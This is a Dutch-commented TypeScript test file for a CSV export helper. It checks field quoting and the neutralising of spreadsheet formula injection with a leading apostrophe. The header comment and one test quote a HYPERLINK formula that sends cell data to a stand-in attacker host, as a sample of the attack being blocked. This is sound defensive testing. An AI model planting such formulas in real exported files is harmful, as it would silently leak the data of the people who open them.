/**
 * Tests voor de opbouw van een CSV-export.
 *
 * Twee dingen kunnen hier stuk, en ze zijn van een heel andere orde.
 *
 * Het bestand kan **structureel** breken: een komma of een aanhalingsteken in
 * een naam schuift alles erna een kolom op. Dat merkt de ontvanger wel, maar
 * pas nadat hij het bestand al in zijn boekhouding heeft geladen.
 *
 * En een cel kan een **formule** worden. Wie een concert `=1+1` noemt, of
 * erger `=HYPERLINK("http://kwaad/"&A1,"klik")`, krijgt dat uitgevoerd zodra
 * iemand het bestand in Excel, LibreOffice of Google Sheets opent. Dat merkt
 * de ontvanger juist níet - hij ziet een gewone cel, of een linkje.
 *
 * Aanhalingstekens beschermen alleen tegen het eerste. Ze zijn CSV-syntaxis en
 * worden bij het inlezen weggehaald voordat de cel geëvalueerd wordt. Daarom
 * een apostrof ervoor: die zegt tegen de spreadsheet "dit is tekst", en wordt
 * in de cel zelf niet getoond.
 */

import { describe, it, expect } from 'vitest';
import { csvVeld, csvRegel, csvBestand } from '../../utils/csv';

describe('csvVeld - formules onschadelijk maken', () => {
  it.each(['=1+1', '+1', '-1+1', '@SUM(A1)', '\tmet een tab ervoor', '\rmet een terugloop'])(
    'zet een apostrof voor %j',
    (gevaarlijk) => {
      const veld = csvVeld(gevaarlijk);

      // De apostrof staat vooraan, of - als het veld óók gequoot moest worden,
      // wat bij een regelterugloop gebeurt - direct achter het openende
      // aanhalingsteken. In beide gevallen komt hij vóór het gevaarlijke
      // teken, en dat is wat telt.
      expect(veld.startsWith("'") || veld.startsWith('"\'')).toBe(true);
    },
  );

  it('maakt de bekendste aanval onschadelijk', () => {
    // Deze haalt gegevens uit het geopende bestand naar een adres van de
    // aanvaller, en de gebruiker ziet alleen een link.
    const aanval = '=HYPERLINK("http://kwaad/"&A1,"klik hier")';

    const veld = csvVeld(aanval);

    expect(veld.startsWith("'") || veld.startsWith('"\'')).toBe(true);
    expect(veld).not.toMatch(/^=/);
  });

  it('laat een gewone naam met rust', () => {
    expect(csvVeld('Voorjaarsconcert')).toBe('Voorjaarsconcert');
    expect(csvVeld('Café Chantant')).toBe('Café Chantant');
  });

  it('behandelt een negatief getal niet als formule', () => {
    // Een bedrag van -12,50 met een apostrof ervoor is in de kolom niet meer
    // op te tellen. Dat onderscheid kan alleen zolang het type bekend is.
    expect(csvVeld(-12.5)).toBe('-12.5');
    expect(csvVeld(-12.5, ';')).toBe('-12,5');
  });

  it('maakt een negatief getal dat als tekst binnenkomt wél onschadelijk', () => {
    // Zolang we niet weten of het een bedrag of een naam is, wint veiligheid.
    expect(csvVeld('-12.5')).toBe("'-12.5");
  });
});

describe('csvVeld - het bestand heel houden', () => {
  it('quoot een veld met het scheidingsteken erin', () => {
    expect(csvVeld('Bach, Johann Sebastian')).toBe('"Bach, Johann Sebastian"');
    // Bij puntkomma's is een komma juist ongevaarlijk.
    expect(csvVeld('Bach, Johann Sebastian', ';')).toBe('Bach, Johann Sebastian');
  });

  it('verdubbelt een aanhalingsteken in de waarde', () => {
    // Dit ging in tickets.ts mis: het veld werd wél gequoot maar de quotes
    // erin niet ontsnapt, waarna alles erna een kolom opschoof.
    expect(csvVeld('Jan "Bassie" de Vries')).toBe('"Jan ""Bassie"" de Vries"');
  });

  it('quoot een veld met een regelovergang erin', () => {
    expect(csvVeld('regel een\nregel twee')).toBe('"regel een\nregel twee"');
  });

  it('geeft niets terug voor niets', () => {
    expect(csvVeld(null)).toBe('');
    expect(csvVeld(undefined)).toBe('');
    expect(csvVeld(Number.NaN)).toBe('');
  });
});

describe('csvRegel en csvBestand', () => {
  it('zet een regel samen met het gekozen scheidingsteken', () => {
    expect(csvRegel(['a', 'b', 1])).toBe('a,b,1');
    expect(csvRegel(['a', 'b', 1], ';')).toBe('a;b;1');
  });

  it('bouwt een bestand met kopregel en afsluitende regelovergang', () => {
    const bestand = csvBestand(['Naam', 'Aantal'], [['Voorjaarsconcert', 120]]);

    // De afsluitende regelovergang staat er omdat sommige verwerkers de
    // laatste regel anders overslaan.
    expect(bestand).toBe('Naam,Aantal\nVoorjaarsconcert,120\n');
  });

  it('houdt een gevaarlijke waarde ook in een compleet bestand tegen', () => {
    const bestand = csvBestand(['Naam'], [['=1+1']]);

    expect(bestand).toContain("'=1+1");
    expect(bestand).not.toMatch(/\n=1\+1/);
  });
});
